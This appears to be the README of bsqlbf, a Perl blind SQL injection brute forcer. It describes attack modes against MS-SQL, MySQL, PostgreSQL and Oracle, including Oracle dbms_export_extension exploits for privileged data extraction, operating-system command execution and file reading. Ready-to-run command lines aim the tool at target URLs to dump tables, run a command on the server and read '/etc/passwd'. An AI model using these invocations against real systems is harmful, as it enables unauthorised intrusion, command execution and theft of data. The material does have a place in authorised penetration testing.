# Introduction #

This is a modified version of 'bsqlbfv1.2-th.pl'. This perl script allows extraction of data from Blind SQL Injections. It accepts custom SQL queries as a command line  parameter and it works for both integer and string based injections. **Databases supported:**

**0. MS-SQL**

**1. MySQL**

**2. PostgreSQL**

**3. Oracle**


The tool supports 6 attack modes(-type switch):-

---

**Type 0: Blind SQL Injection based on true and false conditions returned by back-end server**

**Type 1: Blind SQL Injection based on true and error(e.g syntax error) returned by back-end server.**

**Type 2: Blind SQL Injection in "order by" and "group by".**

**Type 3: extracting data with SYS privileges (ORACLE dbms\_export\_extension exploit)**

**Type 4: is O.S code execution (ORACLE dbms\_export\_extension exploit)**

**Type 5: is reading files (ORACLE dbms\_export\_extension exploit, based on java)**


---

For Type 4(O.S code execution) the following methods are supported:

**-stype:        How you want to execute command:**

> SType 0 (default) is based on java..will NOT work against XE.

> SType 1 is against oracle 9 with plsql\_native\_make\_utility.

> SType 2 is against oracle 10 with dbms\_scheduler.


---


**Usage example**:

$./bsqlbf-v2.pl -url http://192.168.1.1/injection_string_post/1.asp?p=1 -method post -match true -database 0 -sql "select top 1 name from sysobjects where xtype='U'"

./bsqlbf-v2.3.pl -url http://192.168.1.1/injection_string_post/1.jsp?p=1 -type 4 -match "true" -cmd "ping notsosecure.com"

---

**User Interface:**
<pre>ubuntu@ubuntu:~$ ./bsqlbf-v2-3.pl<br>
<br>
// Blind SQL injection brute forcer \\<br>
//originally written by...aramosf@514.es  \\<br>
<br>
// mofified by sid-at-notsosecure.com \\<br>
// http://www.notsosecure.com \\<br>
---------------------usage:-------------------------------------------<br>
<br>
Integer based Injection-->./bsqlbf-v2-3.pl - url http://www.host.com/path/script.php?foo=1000 (options)<br>
<br>
String Based Injection-->./bsqlbf-v2-3.pl - url http://www.host.com/path/script.php?foo=bar' (options)<br>
<br>
------------------------------------options:--------------------------<br>
-sql:          valid SQL syntax to get; version(), database(),<br>
(select  table_name from inforamtion_schema.tables limit 1 offset 0)<br>
-get:          If MySQL user is root, supply word readable file name<br>
-blind:        parameter to inject sql. Default is last value of url<br>
-match:        *RECOMMENDED* string to match in valid query, Default is auto<br>
-start:        if you know the beginning of the string, use it.<br>
-length:       maximum length of value. Default is 32.<br>
-time:         timer options:<br>
0:      dont wait. Default option.<br>
1:      wait 15 seconds<br>
2:      wait 5 minutes<br>
<br>
-type:         Type of injection:<br>
0:      Type 0 (default) is blind injection based on True and False responses<br>
1:      Type 1 is blind injection based on True and Error responses<br>
2:      Type 2 is injection in order by and group by<br>
3:      Type 3 !!New!! is extracting data with SYS privileges (ORACLE dbms_export_extension exploit)<br>
4:      Type 4 !!New!! is O.S code execution (ORACLE dbms_export_extension exploit)<br>
5:      Type 5 !!New!! is reading files (ORACLE dbms_export_extension exploit, based on java)<br>
<br>
-file: File to read (default C:\boot.ini)<br>
<br>
-stype:        How you want to execute command:<br>
0:      SType 0 (default) is based on java..will NOT work against XE<br>
1:      SType 1 is against oracle 9 with plsql_native_make_utility<br>
2:      SType 2 is against oracle 10 with dbms_scheduler<br>
-database:     Backend database:<br>
0:      MS-SQL (Default)<br>
1:      MYSQL<br>
2:      POSTGRES<br>
3:      ORACLE<br>
-rtime:        wait random seconds, for example: "10-20".<br>
-method:       http method to use; get or post. Default is GET.<br>
-cmd:          command to execute(type 4 only). Default is "ping 127.0.0.1."<br>
-uagent:       http UserAgent header to use. Default is bsqlbf 2.3<br>
-ruagent:      file with random http UserAgent header to use.<br>
-cookie:       http cookie header to use<br>
-rproxy:       use random http proxy from file list.<br>
-proxy:        use proxy http. Syntax -proxy=http://proxy:port/<br>
-proxy_user:   proxy http user<br>
-proxy_pass:   proxy http password<br>
<br>
---------------------------- examples:-------------------------------<br>
bash# ./bsqlbf-v2-3.pl -url http://www.somehost.com/blah.php?u=5 -blind u -sql "select table_name from imformation_schema.tables limit 1 offset 0" -database 1 -type 1<br>
<br>
bash# ./bsqlbf-v2-3.pl -url http://www.buggy.com/bug.php?r=514&p=foo' -method post -get "/etc/passwd" -match "foo"<br>
</pre>